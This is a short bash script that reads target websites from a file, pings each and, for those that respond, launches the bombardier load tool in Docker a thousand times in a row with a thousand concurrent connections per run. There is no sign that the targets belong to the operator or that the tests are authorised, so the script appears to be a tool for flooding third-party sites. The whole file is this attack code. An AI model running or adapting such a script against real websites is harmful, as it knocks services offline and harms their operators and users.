#!/usr/bin/bash

input="resources.txt"
site_limit=2

IFS=$'\n' read -d '' -r -a lines < "$input"

line_index=0
length=${#lines[@]}-1
runned_docker=0

while [ $site_limit -gt $runned_docker ]; do
  if [[ "$line_index" -gt $length ]]; then
    line_index=0
  fi

  site=${lines[$line_index]}

  ping -c 1 "$site" > /dev/null
  if [ $? -eq 0 ] ; then
    ((runned_docker++))
    echo "$site is up"

    for ii in {1..1000}; do
      sudo docker run -it alpine/bombardier -c 1000 -d 60s -l https://$site/ && sleep 5;
    done
  else
    echo "$site is down"
  fi

  ((line_index++))

	sleep 1
done